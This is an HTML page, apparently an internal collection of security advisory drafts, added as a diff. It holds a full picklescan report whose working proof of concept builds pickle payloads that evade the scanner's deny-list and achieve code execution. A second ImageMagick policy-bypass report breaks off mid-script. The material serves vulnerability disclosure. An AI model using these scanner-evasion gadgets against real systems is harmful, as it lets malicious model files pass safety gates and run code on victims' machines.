@@ -1,0 +1,3444 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=robots content='noindex,nofollow'><title>GHSA Submissions — 2026-06</title><style>
+:root{--bg:#0d1117;--panel:#161b22;--panel2:#1c2330;--bd:#30363d;--tx:#e6edf3;
+--mut:#9aa7b4;--acc:#2ea043;--acc2:#58a6ff;--mono:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--tx);
+font:15px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+header.top{position:sticky;top:0;z-index:5;background:rgba(13,17,23,.92);backdrop-filter:blur(8px);
+border-bottom:1px solid var(--bd);padding:18px 24px}
+header.top h1{margin:0;font-size:19px;letter-spacing:.2px}
+header.top p{margin:6px 0 0;color:var(--mut);font-size:13px}
+.wrap{max-width:1020px;margin:0 auto;padding:22px 18px 80px}
+.toc{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:8px;margin:0 0 30px}
+.toc-item{display:flex;align-items:center;gap:10px;padding:9px 12px;background:var(--panel);
+border:1px solid var(--bd);border-radius:8px;text-decoration:none;color:var(--tx);font-size:13px}
+.toc-item:hover{border-color:var(--acc2)}
+.toc-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.toc-score{color:var(--mut);font-family:var(--mono)}
+.card{background:var(--panel);border:1px solid var(--bd);border-radius:12px;padding:18px 18px 8px;margin:0 0 22px;scroll-margin-top:84px}
+.chead{display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;align-items:flex-start;
+border-bottom:1px solid var(--bd);padding-bottom:14px;margin-bottom:6px}
+.ctitle{display:flex;gap:10px;align-items:flex-start}
+.cname{font-weight:600;font-size:15.5px}
+.cmeta{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.sev{font-size:11px;font-weight:700;padding:2px 8px;border-radius:20px;white-space:nowrap;text-transform:uppercase;letter-spacing:.4px}
+.sev.crit{background:#67060c;color:#ffd7d5}.sev.high{background:#7d2a09;color:#ffe0b2}
+.sev.med{background:#3d3000;color:#f2e09a}.sev.low{background:#1c3a24;color:#aee0bd}
+.badge{font-size:11px;padding:3px 9px;border-radius:6px;border:1px solid var(--bd);color:var(--mut);background:var(--panel2)}
+.badge.tier1{color:#aee0bd;border-color:#1c3a24}.badge.tier2{color:#f2e09a;border-color:#3d3000}.badge.tier3{color:#9aa7b4}
+.field{padding:11px 0;border-bottom:1px solid rgba(48,54,61,.5)}
+.field:last-of-type{border-bottom:0}
+.flabel{font-size:11px;text-transform:uppercase;letter-spacing:.6px;color:var(--mut);margin-bottom:6px}
+.frow{display:flex;gap:10px;align-items:flex-start}
+.fval{flex:1;margin:0;padding:9px 11px;background:var(--panel2);border:1px solid var(--bd);border-radius:7px;
+font-family:var(--mono);font-size:13px;white-space:pre-wrap;word-break:break-word;overflow-x:auto}
+.fval.big{max-height:340px;overflow:auto;font-size:12.5px;line-height:1.5}
+.copy{flex:0 0 auto;cursor:pointer;border:1px solid var(--bd);background:var(--panel2);color:var(--tx);
+border-radius:7px;padding:8px 13px;font-size:12px;font-weight:600;transition:.15s}
+.copy:hover{border-color:var(--acc);color:#fff}
+.copy.ok{background:var(--acc);border-color:var(--acc);color:#fff}
+.copyall{padding:6px 11px}
+.hidden{display:none}
+footer{color:var(--mut);font-size:12px;text-align:center;padding:30px 0 0}
+</style></head><body><header class=top><h1>GHSA Submissions — 2026-06</h1><p>13 verified findings, laid out in GitHub's exact “Report a vulnerability” field order. Every field has a copy button; each card has “Copy entire submission”. Internal working document — not for publication.</p></header><div class=wrap><div class=toc><a class="toc-item" href="#f1"><span class="sev med">Medium</span><span class="toc-name">picklescan</span><span class="toc-score">6.1</span></a><a class="toc-item" href="#f2"><span class="sev high">High</span><span class="toc-name">ImageMagick #338</span><span class="toc-score">7.2</span></a><a class="toc-item" href="#f3"><span class="sev high">High</span><span class="toc-name">gitea #340</span><span class="toc-score">7.1</span></a><a class="toc-item" href="#f4"><span class="sev high">High</span><span class="toc-name">nuxt #343</span><span class="toc-score">7.5</span></a><a class="toc-item" href="#f5"><span class="sev med">Medium</span><span class="toc-name">jellyfin #342</span><span class="toc-score">6.8</span></a><a class="toc-item" href="#f6"><span class="sev med">Medium</span><span class="toc-name">typst</span><span class="toc-score">5.5</span></a><a class="toc-item" href="#f7"><span class="sev med">Medium</span><span class="toc-name">pocketbase #334</span><span class="toc-score">6.8</span></a><a class="toc-item" href="#f8"><span class="sev med">Medium</span><span class="toc-name">dex transitive SSO</span><span class="toc-score">6.8</span></a><a class="toc-item" href="#f9"><span class="sev med">Medium</span><span class="toc-name">pandoc #341</span><span class="toc-score">6.5</span></a><a class="toc-item" href="#f10"><span class="sev med">Medium</span><span class="toc-name">go-task git cache</span><span class="toc-score">5.0</span></a><a class="toc-item" href="#f11"><span class="sev med">Medium</span><span class="toc-name">dive</span><span class="toc-score">4.4</span></a><a class="toc-item" href="#f12"><span class="sev med">Medium</span><span class="toc-name">go-task env exfil</span><span class="toc-score">6.5</span></a><a class="toc-item" href="#f13"><span class="sev med">Medium</span><span class="toc-name">go-task if injection</span><span class="toc-score">5.5</span></a></div><section class="card" id="f1"><div class="chead"><div class="ctitle"><span class="sev med">Medium</span><span class="cname">1. picklescan deny-list evasion lets malicious pickles pass as clean (RCE)</span></div><div class="cmeta"><span class="badge tier1">Tier 1</span><span class="badge chan">GHSA</span><button class="copy copyall" data-target="f1-full">Copy entire submission</button></div></div><div class="field"><div class="flabel">Advisory title</div><div class="frow"><pre class="fval" id="f1-title">picklescan deny-list evasion lets malicious pickles pass as clean (RCE)</pre><button class="copy" data-target="f1-title">Copy</button></div></div><div class="field"><div class="flabel">CVE identifier</div><div class="frow"><pre class="fval" id="f1-cve">Request CVE ID later</pre><button class="copy" data-target="f1-cve">Copy</button></div></div><div class="field"><div class="flabel">Severity — CVSS v3.1 vector (6.1, Medium)</div><div class="frow"><pre class="fval" id="f1-cvss">AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</pre><button class="copy" data-target="f1-cvss">Copy</button></div></div><div class="field"><div class="flabel">Weaknesses (CWE)</div><div class="frow"><pre class="fval" id="f1-cwe">CWE-693, CWE-184</pre><button class="copy" data-target="f1-cwe">Copy</button></div></div><div class="field"><div class="flabel">Ecosystem</div><div class="frow"><pre class="fval" id="f1-eco">pip (PyPI)</pre><button class="copy" data-target="f1-eco">Copy</button></div></div><div class="field"><div class="flabel">Package name</div><div class="frow"><pre class="fval" id="f1-pkg">picklescan</pre><button class="copy" data-target="f1-pkg">Copy</button></div></div><div class="field"><div class="flabel">Affected versions</div><div class="frow"><pre class="fval" id="f1-aff">&lt;= 1.0.4</pre><button class="copy" data-target="f1-aff">Copy</button></div></div><div class="field"><div class="flabel">Patched versions</div><div class="frow"><pre class="fval" id="f1-patched">None</pre><button class="copy" data-target="f1-patched">Copy</button></div></div><div class="field"><div class="flabel">Description</div><div class="frow"><pre class="fval big" id="f1-desc">## Summary
+
+picklescan classifies any global whose `(module, name)` is not in its deny-list
+(`_unsafe_globals`) as `SafetyLevel.Suspicious`. The Suspicious tier does **not**
+increment `issues_count` or `infected_files`, so the scanner reports the file as
+carrying no malware (`issues_count = 0`, CLI exit `0`) while a real unpickler resolves
+and calls the global. Because the deny-list is the sole security boundary, every
+dangerous callable missing from it is a bypass. Three live bypass gadgets are
+demonstrated below, including one that yields arbitrary code execution. A separate
+minor defect causes `python -m picklescan` to always exit `0`.
+
+## Root cause
+
+In `picklescan/scanner.py`, classification assigns Suspicious to anything not
+explicitly listed, and only Dangerous bumps the issue counter:
+
+```python
+# scanner.py (1.0.4)
+elif ...:                       # 418/422: deny-listed → Dangerous
+    g.safety = SafetyLevel.Dangerous
+    issues_count += 1
+elif &lt;in _safe_globals&gt;:        # 426: Innocuous  (no increment)
+    g.safety = SafetyLevel.Innocuous
+else:                           # 428: everything else → Suspicious (no increment)
+    g.safety = SafetyLevel.Suspicious
+return ScanResult(globals, 1, issues_count, 1 if issues_count &gt; 0 else 0, scan_err)  # 431
+```
+
+```python
+# cli.py:114
+return 0 if scan_result.issues_count == 0 else 1
+```
+
+A global that is dangerous in practice but absent from `_unsafe_globals` therefore
+travels the `else` branch → Suspicious → `issues_count` stays `0` → exit `0` (clean).
+
+The deny-list entries the gadgets evade:
+
+```python
+# scanner.py
+&quot;types&quot;: {&quot;CodeType&quot;},                          # line 150 — FunctionType NOT listed
+&quot;_io&quot;:   {&quot;FileIO&quot;},                            # line 159 — the io.FileIO alias NOT listed
+&quot;code&quot;:  {&quot;InteractiveInterpreter.runcode&quot;},    # line 182 — InteractiveConsole.push NOT listed
+```
+
+## Proof of concept
+
+The harness builds each payload, scans it with the **real** installed picklescan
+1.0.4, then executes it in a **separate** `python -c &quot;pickle.load(...)&quot;` subprocess.
+Oracle = a sentinel file the payload writes on load. A negative control uses the
+**deny-listed** `_io.FileIO` (the same file-create capability) to show the scanner
+correctly flags the listed name and only misses the aliases.
+
+```python
+import io, os, sys, pickle, marshal, struct, code, subprocess, tempfile
+from picklescan.scanner import scan_pickle_bytes
+
+def scan(b):
+    r = scan_pickle_bytes(io.BytesIO(b), &quot;poc&quot;)
+    return r.issues_count, r.infected_files, [(g.module, g.name, g.safety.value) for g in r.globals]
+
+def execute(b):  # real, separate unpickler
+    with tempfile.NamedTemporaryFile(suffix=&quot;.pkl&quot;, delete=False) as f:
+        f.write(b); fn = f.name
+    subprocess.run([sys.executable, &quot;-c&quot;,
+                    &quot;import pickle,sys; pickle.load(open(sys.argv[1],&#x27;rb&#x27;))&quot;, fn])
+    os.unlink(fn)
+
+# --- minimal protocol-4 opcode assembler ---
+g  = lambda m,n: b&quot;c&quot;+m.encode()+b&quot;\n&quot;+n.encode()+b&quot;\n&quot;
+u  = lambda s: b&quot;\x8c&quot;+bytes([len(s)])+s.encode()
+bb = lambda x: b&quot;\x8e&quot;+struct.pack(&quot;&lt;Q&quot;,len(x))+x
+call = lambda c,*a: c+b&quot;(&quot;+b&quot;&quot;.join(a)+b&quot;tR&quot;
+
+# V2a: io.FileIO (alias of deny-listed _io.FileIO) — creates/truncates a file
+io_fileio = b&quot;\x80\x04&quot;+call(g(&quot;io&quot;,&quot;FileIO&quot;), u(&quot;/tmp/psc_v2a&quot;), u(&quot;w&quot;))+b&quot;.&quot;
+
+# V2b: types.FunctionType(marshal.loads(&lt;code&gt;), {})() — arbitrary code execution
+co = marshal.dumps(compile(&quot;open(&#x27;/tmp/psc_v2b&#x27;,&#x27;w&#x27;).write(&#x27;pwned&#x27;)&quot;,&quot;&lt;poc&gt;&quot;,&quot;exec&quot;))
+rce = b&quot;\x80\x04&quot;+call(g(&quot;types&quot;,&quot;FunctionType&quot;), call(g(&quot;marshal&quot;,&quot;loads&quot;), bb(co)), b&quot;}&quot;)+b&quot;)R.&quot;
+
+# V1: code.InteractiveConsole.push — compiles + exec()s its argument
+class V1:
+    def __reduce__(self):
+        return (code.InteractiveConsole.push,
+                (code.InteractiveConsole(), &quot;open(&#x27;/tmp/psc_v1&#x27;,&#x27;w&#x27;).write(&#x27;x&#x27;)&quot;))
+v1 = pickle.dumps(V1(), protocol=4)
+
+for name, payload in [(&quot;V1 InteractiveConsole.push&quot;, v1),
+                      (&quot;V2a io.FileIO alias&quot;, io_fileio),
+                      (&quot;V2b FunctionType+marshal RCE&quot;, rce)]:
+    ic, inf, globs = scan(payload)
+    print(name, &quot;-&gt; issues=%d infected=%d globals=%s&quot; % (ic, inf, globs))
+    execute(payload)
+```
+
+### Observed output (real picklescan 1.0.4, CPython 3.14.6)
+
+```
+[V1] code.InteractiveConsole.push
+  globals: [(&#x27;codeop&#x27;,&#x27;CommandCompiler&#x27;,&#x27;suspicious&#x27;), (&#x27;code&#x27;,&#x27;InteractiveConsole&#x27;,&#x27;suspicious&#x27;),
+            (&#x27;code&#x27;,&#x27;InteractiveConsole.push&#x27;,&#x27;suspicious&#x27;), (&#x27;codeop&#x27;,&#x27;Compile&#x27;,&#x27;suspicious&#x27;)]
+  issues_count=0 infected_files=0 cli_exit=0 (CLEAN)   payload executed: True   =&gt; BYPASS
+
+[V2a] io.FileIO alias -&gt; file create
+  globals: [(&#x27;io&#x27;,&#x27;FileIO&#x27;,&#x27;suspicious&#x27;)]
+  issues_count=0 infected_files=0 cli_exit=0 (CLEAN)   payload executed: True   =&gt; BYPASS
+
+[V2b] types.FunctionType + marshal.loads -&gt; arbitrary code execution
+  globals: [(&#x27;marshal&#x27;,&#x27;loads&#x27;,&#x27;suspicious&#x27;), (&#x27;types&#x27;,&#x27;FunctionType&#x27;,&#x27;suspicious&#x27;)]
+  issues_count=0 infected_files=0 cli_exit=0 (CLEAN)   payload executed: True   =&gt; BYPASS
+
+[CONTROL] _io.FileIO (deny-listed) -&gt; SAME file-create capability
+  globals: [(&#x27;_io&#x27;,&#x27;FileIO&#x27;,&#x27;dangerous&#x27;)]
+  issues_count=1 infected_files=1 cli_exit=1 (FLAGGED) payload executed: True   =&gt; correctly flagged
+```
+
+The control confirms the differentiator is purely the missing deny-list entry: the
+identical file-create capability is flagged as Dangerous under `_io.FileIO` but passes
+clean under the `io.FileIO` alias.
+
+## Impact
+
+An attacker can ship a malicious model/pickle file (`.pkl`, `.pt`, `.bin`, etc.) that
+picklescan reports as clean (exit 0) while it executes arbitrary Python on
+`pickle.load` / `torch.load`. This defeats picklescan&#x27;s entire purpose as a
+supply-chain safety gate (CLI `-p`, `scan_huggingface_model`, CI gates on downloaded
+models). `types.FunctionType` + `marshal.loads` is the full-RCE vector;
+`io.FileIO`/`code.InteractiveConsole.push` give arbitrary file create/truncate and
+`exec()` respectively.
+
+This is the same mechanism class as prior picklescan deny-list CVEs (e.g.
+CVE-2025-1716 `pip`, CVE-2025-46417 `ssl`) — one missing global per CVE. The specific
+gadgets here are not in any published advisory and are live on the current release.
+
+## Additional defect — `python -m picklescan` ignores its exit code
+
+`__main__.py:3` calls `main()` without `sys.exit(main())`, so the `-m` invocation
+always exits `0` even when it prints a Dangerous finding. The setuptools console
+script (`picklescan = picklescan.cli:main`) wraps `sys.exit` correctly, so only the
+module form is affected — but a CI gate keyed on the documented exit codes via
+`python -m picklescan` passes files picklescan itself flagged. Observed:
+
+```
+$ python -m picklescan -p dangerous__io_FileIO.pkl
+.../tmp.pkl: dangerous import &#x27;_io FileIO&#x27; FOUND
+----------- SCAN SUMMARY -----------  Infected files: 1 ...
+$ echo $?
+0          # exit-code bug: should be 1
+```
+
+## Suggested fix
+
+1. Treat `SafetyLevel.Suspicious` as a non-zero result (or move to an allowlist-only
+   model where only `_safe_globals` passes clean). A deny-list as the sole boundary
+   means every omission is a silent bypass.
+2. Close the demonstrated gaps: block the `code`/`codeop` modules wholesale, add
+   `io.FileIO` alongside `_io.FileIO`, and add `types.FunctionType` + `marshal`
+   (`loads`/`load`) to `_unsafe_globals`.
+3. Fix `__main__.py` to `sys.exit(main())`.
+
+## Note — 7z member-name containment (investigated, not currently exploitable)
+
+`scan_7z_bytes` extracts archive members by name with no path containment of its own.
+With the pinned `py7zr==0.22.0` this is not exploitable: py7zr rejects `..`/absolute
+member names at both write and extract (post CVE-2022-44900 hardening), so no
+traversal archive reaches the scanner&#x27;s `open`. It is a latent defense-in-depth gap
+that would re-open against an older or unpinned py7zr; picklescan should add its own
+containment rather than rely on the dependency.</pre><button class="copy" data-target="f1-desc">Copy</button></div></div><pre class="hidden" id="f1-full">Title: picklescan deny-list evasion lets malicious pickles pass as clean (RCE)
+CVE identifier: Request CVE ID later
+Severity (CVSS v3.1): AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (6.1, Medium)
+Weaknesses (CWE): CWE-693, CWE-184
+Ecosystem: pip (PyPI)
+Package name: picklescan
+Affected versions: &lt;= 1.0.4
+Patched versions: None
+
+Description:
+## Summary
+
+picklescan classifies any global whose `(module, name)` is not in its deny-list
+(`_unsafe_globals`) as `SafetyLevel.Suspicious`. The Suspicious tier does **not**
+increment `issues_count` or `infected_files`, so the scanner reports the file as
+carrying no malware (`issues_count = 0`, CLI exit `0`) while a real unpickler resolves
+and calls the global. Because the deny-list is the sole security boundary, every
+dangerous callable missing from it is a bypass. Three live bypass gadgets are
+demonstrated below, including one that yields arbitrary code execution. A separate
+minor defect causes `python -m picklescan` to always exit `0`.
+
+## Root cause
+
+In `picklescan/scanner.py`, classification assigns Suspicious to anything not
+explicitly listed, and only Dangerous bumps the issue counter:
+
+```python
+# scanner.py (1.0.4)
+elif ...:                       # 418/422: deny-listed → Dangerous
+    g.safety = SafetyLevel.Dangerous
+    issues_count += 1
+elif &lt;in _safe_globals&gt;:        # 426: Innocuous  (no increment)
+    g.safety = SafetyLevel.Innocuous
+else:                           # 428: everything else → Suspicious (no increment)
+    g.safety = SafetyLevel.Suspicious
+return ScanResult(globals, 1, issues_count, 1 if issues_count &gt; 0 else 0, scan_err)  # 431
+```
+
+```python
+# cli.py:114
+return 0 if scan_result.issues_count == 0 else 1
+```
+
+A global that is dangerous in practice but absent from `_unsafe_globals` therefore
+travels the `else` branch → Suspicious → `issues_count` stays `0` → exit `0` (clean).
+
+The deny-list entries the gadgets evade:
+
+```python
+# scanner.py
+&quot;types&quot;: {&quot;CodeType&quot;},                          # line 150 — FunctionType NOT listed
+&quot;_io&quot;:   {&quot;FileIO&quot;},                            # line 159 — the io.FileIO alias NOT listed
+&quot;code&quot;:  {&quot;InteractiveInterpreter.runcode&quot;},    # line 182 — InteractiveConsole.push NOT listed
+```
+
+## Proof of concept
+
+The harness builds each payload, scans it with the **real** installed picklescan
+1.0.4, then executes it in a **separate** `python -c &quot;pickle.load(...)&quot;` subprocess.
+Oracle = a sentinel file the payload writes on load. A negative control uses the
+**deny-listed** `_io.FileIO` (the same file-create capability) to show the scanner
+correctly flags the listed name and only misses the aliases.
+
+```python
+import io, os, sys, pickle, marshal, struct, code, subprocess, tempfile
+from picklescan.scanner import scan_pickle_bytes
+
+def scan(b):
+    r = scan_pickle_bytes(io.BytesIO(b), &quot;poc&quot;)
+    return r.issues_count, r.infected_files, [(g.module, g.name, g.safety.value) for g in r.globals]
+
+def execute(b):  # real, separate unpickler
+    with tempfile.NamedTemporaryFile(suffix=&quot;.pkl&quot;, delete=False) as f:
+        f.write(b); fn = f.name
+    subprocess.run([sys.executable, &quot;-c&quot;,
+                    &quot;import pickle,sys; pickle.load(open(sys.argv[1],&#x27;rb&#x27;))&quot;, fn])
+    os.unlink(fn)
+
+# --- minimal protocol-4 opcode assembler ---
+g  = lambda m,n: b&quot;c&quot;+m.encode()+b&quot;\n&quot;+n.encode()+b&quot;\n&quot;
+u  = lambda s: b&quot;\x8c&quot;+bytes([len(s)])+s.encode()
+bb = lambda x: b&quot;\x8e&quot;+struct.pack(&quot;&lt;Q&quot;,len(x))+x
+call = lambda c,*a: c+b&quot;(&quot;+b&quot;&quot;.join(a)+b&quot;tR&quot;
+
+# V2a: io.FileIO (alias of deny-listed _io.FileIO) — creates/truncates a file
+io_fileio = b&quot;\x80\x04&quot;+call(g(&quot;io&quot;,&quot;FileIO&quot;), u(&quot;/tmp/psc_v2a&quot;), u(&quot;w&quot;))+b&quot;.&quot;
+
+# V2b: types.FunctionType(marshal.loads(&lt;code&gt;), {})() — arbitrary code execution
+co = marshal.dumps(compile(&quot;open(&#x27;/tmp/psc_v2b&#x27;,&#x27;w&#x27;).write(&#x27;pwned&#x27;)&quot;,&quot;&lt;poc&gt;&quot;,&quot;exec&quot;))
+rce = b&quot;\x80\x04&quot;+call(g(&quot;types&quot;,&quot;FunctionType&quot;), call(g(&quot;marshal&quot;,&quot;loads&quot;), bb(co)), b&quot;}&quot;)+b&quot;)R.&quot;
+
+# V1: code.InteractiveConsole.push — compiles + exec()s its argument
+class V1:
+    def __reduce__(self):
+        return (code.InteractiveConsole.push,
+                (code.InteractiveConsole(), &quot;open(&#x27;/tmp/psc_v1&#x27;,&#x27;w&#x27;).write(&#x27;x&#x27;)&quot;))
+v1 = pickle.dumps(V1(), protocol=4)
+
+for name, payload in [(&quot;V1 InteractiveConsole.push&quot;, v1),
+                      (&quot;V2a io.FileIO alias&quot;, io_fileio),
+                      (&quot;V2b FunctionType+marshal RCE&quot;, rce)]:
+    ic, inf, globs = scan(payload)
+    print(name, &quot;-&gt; issues=%d infected=%d globals=%s&quot; % (ic, inf, globs))
+    execute(payload)
+```
+
+### Observed output (real picklescan 1.0.4, CPython 3.14.6)
+
+```
+[V1] code.InteractiveConsole.push
+  globals: [(&#x27;codeop&#x27;,&#x27;CommandCompiler&#x27;,&#x27;suspicious&#x27;), (&#x27;code&#x27;,&#x27;InteractiveConsole&#x27;,&#x27;suspicious&#x27;),
+            (&#x27;code&#x27;,&#x27;InteractiveConsole.push&#x27;,&#x27;suspicious&#x27;), (&#x27;codeop&#x27;,&#x27;Compile&#x27;,&#x27;suspicious&#x27;)]
+  issues_count=0 infected_files=0 cli_exit=0 (CLEAN)   payload executed: True   =&gt; BYPASS
+
+[V2a] io.FileIO alias -&gt; file create
+  globals: [(&#x27;io&#x27;,&#x27;FileIO&#x27;,&#x27;suspicious&#x27;)]
+  issues_count=0 infected_files=0 cli_exit=0 (CLEAN)   payload executed: True   =&gt; BYPASS
+
+[V2b] types.FunctionType + marshal.loads -&gt; arbitrary code execution
+  globals: [(&#x27;marshal&#x27;,&#x27;loads&#x27;,&#x27;suspicious&#x27;), (&#x27;types&#x27;,&#x27;FunctionType&#x27;,&#x27;suspicious&#x27;)]
+  issues_count=0 infected_files=0 cli_exit=0 (CLEAN)   payload executed: True   =&gt; BYPASS
+
+[CONTROL] _io.FileIO (deny-listed) -&gt; SAME file-create capability
+  globals: [(&#x27;_io&#x27;,&#x27;FileIO&#x27;,&#x27;dangerous&#x27;)]
+  issues_count=1 infected_files=1 cli_exit=1 (FLAGGED) payload executed: True   =&gt; correctly flagged
+```
+
+The control confirms the differentiator is purely the missing deny-list entry: the
+identical file-create capability is flagged as Dangerous under `_io.FileIO` but passes
+clean under the `io.FileIO` alias.
+
+## Impact
+
+An attacker can ship a malicious model/pickle file (`.pkl`, `.pt`, `.bin`, etc.) that
+picklescan reports as clean (exit 0) while it executes arbitrary Python on
+`pickle.load` / `torch.load`. This defeats picklescan&#x27;s entire purpose as a
+supply-chain safety gate (CLI `-p`, `scan_huggingface_model`, CI gates on downloaded
+models). `types.FunctionType` + `marshal.loads` is the full-RCE vector;
+`io.FileIO`/`code.InteractiveConsole.push` give arbitrary file create/truncate and
+`exec()` respectively.
+
+This is the same mechanism class as prior picklescan deny-list CVEs (e.g.
+CVE-2025-1716 `pip`, CVE-2025-46417 `ssl`) — one missing global per CVE. The specific
+gadgets here are not in any published advisory and are live on the current release.
+
+## Additional defect — `python -m picklescan` ignores its exit code
+
+`__main__.py:3` calls `main()` without `sys.exit(main())`, so the `-m` invocation
+always exits `0` even when it prints a Dangerous finding. The setuptools console
+script (`picklescan = picklescan.cli:main`) wraps `sys.exit` correctly, so only the
+module form is affected — but a CI gate keyed on the documented exit codes via
+`python -m picklescan` passes files picklescan itself flagged. Observed:
+
+```
+$ python -m picklescan -p dangerous__io_FileIO.pkl
+.../tmp.pkl: dangerous import &#x27;_io FileIO&#x27; FOUND
+----------- SCAN SUMMARY -----------  Infected files: 1 ...
+$ echo $?
+0          # exit-code bug: should be 1
+```
+
+## Suggested fix
+
+1. Treat `SafetyLevel.Suspicious` as a non-zero result (or move to an allowlist-only
+   model where only `_safe_globals` passes clean). A deny-list as the sole boundary
+   means every omission is a silent bypass.
+2. Close the demonstrated gaps: block the `code`/`codeop` modules wholesale, add
+   `io.FileIO` alongside `_io.FileIO`, and add `types.FunctionType` + `marshal`
+   (`loads`/`load`) to `_unsafe_globals`.
+3. Fix `__main__.py` to `sys.exit(main())`.
+
+## Note — 7z member-name containment (investigated, not currently exploitable)
+
+`scan_7z_bytes` extracts archive members by name with no path containment of its own.
+With the pinned `py7zr==0.22.0` this is not exploitable: py7zr rejects `..`/absolute
+member names at both write and extract (post CVE-2022-44900 hardening), so no
+traversal archive reaches the scanner&#x27;s `open`. It is a latent defense-in-depth gap
+that would re-open against an older or unpinned py7zr; picklescan should add its own
+containment rather than rely on the dependency.
+</pre></section><section class="card" id="f2"><div class="chead"><div class="ctitle"><span class="sev high">High</span><span class="cname">2. policy.xml coder pattern=&quot;PS&quot; does not block EPS/EPSF/EPSI/EPI — Ghostscript executes</span></div><div class="cmeta"><span class="badge tier1">Tier 1</span><span class="badge chan">GHSA</span><button class="copy copyall" data-target="f2-full">Copy entire submission</button></div></div><div class="field"><div class="flabel">Advisory title</div><div class="frow"><pre class="fval" id="f2-title">policy.xml coder pattern=&quot;PS&quot; does not block EPS/EPSF/EPSI/EPI — Ghostscript executes</pre><button class="copy" data-target="f2-title">Copy</button></div></div><div class="field"><div class="flabel">CVE identifier</div><div class="frow"><pre class="fval" id="f2-cve">Request CVE ID later</pre><button class="copy" data-target="f2-cve">Copy</button></div></div><div class="field"><div class="flabel">Severity — CVSS v3.1 vector (7.2, High)</div><div class="frow"><pre class="fval" id="f2-cvss">AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N</pre><button class="copy" data-target="f2-cvss">Copy</button></div></div><div class="field"><div class="flabel">Weaknesses (CWE)</div><div class="frow"><pre class="fval" id="f2-cwe">CWE-284, CWE-863</pre><button class="copy" data-target="f2-cwe">Copy</button></div></div><div class="field"><div class="flabel">Ecosystem</div><div class="frow"><pre class="fval" id="f2-eco">Other (C library — distributed via OS packages/source)</pre><button class="copy" data-target="f2-eco">Copy</button></div></div><div class="field"><div class="flabel">Package name</div><div class="frow"><pre class="fval" id="f2-pkg">ImageMagick</pre><button class="copy" data-target="f2-pkg">Copy</button></div></div><div class="field"><div class="flabel">Affected versions</div><div class="frow"><pre class="fval" id="f2-aff">7.x through 7.1.2-26 (6.x likely affected)</pre><button class="copy" data-target="f2-aff">Copy</button></div></div><div class="field"><div class="flabel">Patched versions</div><div class="frow"><pre class="fval" id="f2-patched">None</pre><button class="copy" data-target="f2-patched">Copy</button></div></div><div class="field"><div class="flabel">Description</div><div class="frow"><pre class="fval big" id="f2-desc">## Summary
+
+The ImageMagick `policy.xml` hardening guide instructs administrators to add
+`&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;PS&quot;/&gt;` to block PostScript/Ghostscript
+processing. This policy only matches files where the internal format identifier
+equals `&quot;PS&quot;`. The PostScript coder module (`coders/ps.c`) registers five format
+names under the same module: `PS`, `EPS`, `EPSF`, `EPSI`, and `EPI`. The policy
+check (`IsCoderAuthorized`) evaluates the format name, not the module name, so any
+EPS-family file bypasses the restriction and causes Ghostscript to execute on the
+attacker-controlled content.
+
+## Description
+
+`coders/ps.c` registers all PostScript variants under the single module `&quot;PS&quot;`:
+
+```c
+entry = AcquireMagickInfo(&quot;PS&quot;, &quot;EPS&quot;,  &quot;Encapsulated PostScript&quot;);  // line 979
+entry = AcquireMagickInfo(&quot;PS&quot;, &quot;EPSF&quot;, &quot;Encapsulated PostScript&quot;);  // line 988
+entry = AcquireMagickInfo(&quot;PS&quot;, &quot;EPSI&quot;, &quot;Encapsulated PostScript Interchange&quot;); // line 997
+entry = AcquireMagickInfo(&quot;PS&quot;, &quot;EPI&quot;,  &quot;Encapsulated PostScript Interchange&quot;); // line 969
+```
+
+The arguments are `(module, format, description)`. `IsCoderAuthorized` at
+`MagickCore/constitute.c:454` checks the format name:
+
+```c
+status = IsRightsAuthorized(CoderPolicyDomain, rights, coder);
+// coder = read_info-&gt;magick = &quot;EPS&quot; for a .eps file
+// policy pattern = &quot;PS&quot;
+// &quot;PS&quot; does not match &quot;EPS&quot; → check passes → Ghostscript executes
+```
+
+The module name is checked separately against `ModulePolicyDomain` (line 456), but
+only `domain=&quot;module&quot;` policies reach that branch. A `domain=&quot;coder&quot;` policy with
+`pattern=&quot;PS&quot;` never evaluates the module name.
+
+&gt; Source-anchor note: line numbers drift by ~6 lines depending on the pinned commit;
+&gt; `magick -list format` confirms the `EPS`/`EPSF`/`EPSI`/`EPI → module PS` mapping
+&gt; directly regardless of commit.
+
+## Proof of Concept
+
+```bash
+#!/usr/bin/env bash
+# Requires ImageMagick 7.x and Ghostscript installed.
+
+# 1. Write a policy that &quot;blocks PS&quot;
+CONF=$(mktemp -d)
+cat &gt; &quot;$CONF/policy.xml&quot; &lt;&lt; &#x27;EOF&#x27;
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE policymap [
+  &lt;!ELEMENT policymap (policy)*&gt;
+  &lt;!ELEMENT policy EMPTY&gt;
+  &lt;!ATTLIST policy domain NMTOKEN #REQUIRED&gt;
+  &lt;!ATTLIST policy rights NMTOKEN #IMPLIED&gt;
+  &lt;!ATTLIST policy pattern CDATA #IMPLIED&gt;
+]&gt;
+&lt;policymap&gt;
+  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;PS&quot;/&gt;
+&lt;/policymap&gt;
+EOF
+
+# 2. Minimal EPS file
+printf &#x27;%%!PS-Adobe-3.0 EPSF-3.0\n%%%%BoundingBox: 0 0 72 72\nshowpage\n&#x27; &gt; /tmp/test.eps
+
+# 3. Explicit PS: prefix — correctly blocked
+echo -n &quot;PS: prefix (should block): &quot;
+MAGICK_CONFIGURE_PATH=&quot;$CONF&quot; magick PS:/tmp/test.eps /tmp/out.png 2&gt;&amp;1 \
+  &amp;&amp; echo &quot;FAIL (not blocked)&quot; || echo &quot;OK (blocked)&quot;
+
+# 4. .eps extension — bypass
+echo -n &quot;.eps file (should block):  &quot;
